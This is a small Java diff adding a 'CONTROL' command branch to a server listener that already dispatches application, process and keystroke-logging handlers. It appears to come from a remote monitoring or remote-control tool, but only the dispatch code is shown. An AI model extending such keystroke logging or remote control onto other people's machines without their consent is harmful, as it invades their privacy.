@@ -63,6 +63,7 @@ public class ServerListener implements ActionListener{
 				if(s.equals("APPLICATION")) new AppListener().main(null);
 				else if(s.equals("PROCESS")) new ProcessListener().main(null);
 				else if(s.equals("KEYSTROKE")) new KeyLogListener();
+				else if(s.equals("CONTROL")) new ControlListener();
 				else if(s.equals("EXIT")) isRunning = false;
 				else isRunning = false;
 				
